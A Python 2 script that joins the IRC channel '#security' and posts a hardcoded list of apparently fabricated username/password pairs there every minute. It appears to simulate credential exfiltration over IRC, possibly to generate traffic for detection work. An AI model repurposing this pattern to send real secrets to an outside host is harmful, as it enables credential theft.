#!/usr/bin/env python2
import socket
import sys
import time

username = "root"
nickname = "root1"
channel = "#security"
servername = "engineering.internetresearch.ru"

users = [('jon1', 'GeneralAlee123@'), 
	('jacob_1', 'DKlllkd89'), 
	('jacob_2', '9214ekjadfgBB'), 
	('adam_1', 'password1'), 
	('adam_2', 'Password11'), 
	('root', 'GodWilling'), 
	('admin', 'GoWest123'), 
	('administrator', 'dkkkM2ws12'), 
	('jake_1', '1234!@#$'), 
	('ssh', 'abcde33#$'), 
	('powershell1', 'peopleIf3'), 
	('httpd', '00oojkle321!@#'), 
	('manager', 'masdfa7890E&*WUE'), 
	('Manager', '_0dasfjKL73C'), 
	('manager1', '&hadf#,mdEFD0_ttkel'), 
	('account1', 'password1'), 
	('system', '33adfdEFD0_ttkel'), 
	('systemd', 'anderse3r899god'), 
	('systemctl', 'andypeopleandrewsthe3'), 
	('hypervisor', 'suqerlmamalel'), 
	('boot', 'gosweahaks'), 
	('boot1', 'goredskins'), 
	('scott_1', 'JUN031985'), 
	('scott_2', 'MAY031985'), 
	('scott_3', 'APR031985'), 
	('scott_4', '02031985'), 
	('fred_1', '03031985'), 
	('fred_2', '04141985'), 
	('fred_3', '05131985'), 
	('fred_4', '03061984'), 
	('john_1', '05051982'), 
	('john_2', '02011983')
	]

class IRCSimpleClient:
    # by bl4de | github.com/bl4de | twitter.com/_bl4de | hackerone.com/bl4de
    def __init__(self, username, channel, server="irc.freenode.net", port=6667):
        self.username = username
        self.server = server
        self.port = port
        self.channel = channel

    def connect(self):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((self.server, self.port))

    def get_response(self):
        return self.conn.recv(512)

    def send_cmd(self, cmd, message):
        command = "{} {}\r\n".format(cmd, message)
	print command
        self.conn.send(command)

    def send_raw_cmd(self, raw_cmd):
	print raw_cmd
	self.conn.send(raw_cmd + '\n')

    def send_message_to_channel(self, message):
        command = "PRIVMSG {}".format(self.channel)
        message = ":" + message
        self.send_cmd(command, message)

    def join_channel(self):
        cmd = "JOIN"
        channel = self.channel
        self.send_cmd(cmd, channel)

    def quit(self):
        client.send_cmd("QUIT", "Good bye!")

    def print_response(self):
        resp = self.get_response()
        if resp:
            msg = resp.strip().split(":")
            print "\n< {}> {}".format(msg[1].split("!")[0], msg[2].strip())


def run(client):
    while True:
	for user, password in users:
	    message = "user: {}; password hash: {}".format(user, password)
            client.send_message_to_channel(message)
	    time.sleep(60)



if __name__ == "__main__":

    cmd = ""
    joined = False
    client = IRCSimpleClient(username, channel)
    client.connect()

    while(joined == False):
        resp = client.get_response()
        if resp:
 	    print resp
        if "No Ident response" in resp:
	    pass
            client.send_cmd("NICK", username)
            client.send_cmd(
                "USER", "{} * * :{}".format(username, username))


        # we're accepted, now let's join the channel!
        if "Found your hostname" in resp:
	    cap = "CAP LS 302"
	    client.send_raw_cmd(cap)
	    nick = "NICK {}".format(nickname)
	    user = "USER {} {} {} :realname".format(username, username, "192.168.1.1")
            client.send_raw_cmd("{}\n{}".format(nick, user))
	    time.sleep(3)
            client.join_channel()

        # username already in use? try to use username with _
        if "433" in resp or "Found your hostname" in resp:
	    pass
            username = "_" + username
            client.send_cmd("NICK", username)
            client.send_cmd(
                "USER", "{} * * :{}".format(username, username))

        # if PING send PONG with name of the server
        if "PING" in resp:
            client.send_cmd("PONG", ":" + resp.split(":")[1])

	if "JOIN :{}".format(channel) in resp:
	    client.send_cmd("MODE", "#{}".format(channel))
	    time.sleep(1)
	    #client.send_cmd("WHO", "#{}".format(channel))
	    print "joined"
            joined = True
	    
    run(client)

    client.send_message_to_channel(message)
    client.quit()
    time.sleep(1)


